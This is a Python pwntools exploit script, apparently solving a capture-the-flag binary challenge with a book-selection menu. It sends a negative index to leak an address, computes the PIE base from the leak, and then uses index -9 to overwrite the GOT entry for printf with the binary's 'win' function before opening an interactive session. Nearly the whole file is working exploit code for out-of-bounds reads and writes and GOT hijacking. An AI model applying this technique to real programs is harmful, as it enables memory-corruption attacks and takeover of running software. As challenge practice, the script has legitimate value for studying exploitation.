from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)

gs = '''
break *$rebase(0x12e0)
continue
'''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


p = start()

index = -3
p.recvuntil(b'Which book would you like to read [0-3]')
p.sendline(b"%i" % index)
p.recvuntil(b'>>> This book: ')
leak = u64(p.recvuntil(b' ').strip(b' ').ljust(8, b'\x00'))
p.sendlineafter(b'Name of New Book >>>', b'0')

e.address = leak-16456

log.info("Leaking Offset at index: %i" % index)
log.info("Leak: 0x%x" % leak)
log.info("Leak (0x%x) - Offset(0x%x) = Base (0x%x)" % (leak, 16456, e.address))
log.info('Base address: 0x%x' % e.address)

log.info('Win Func: 0x%x' % e.sym['win'])

log.info("Overwriting GOT Entry with index: -9")
index = -9
p.sendline(b"%i" % index)
p.sendline(p64(e.sym['win']))
log.info("GOT[printf]=e.sym['win']")
pause()

p.interactive()
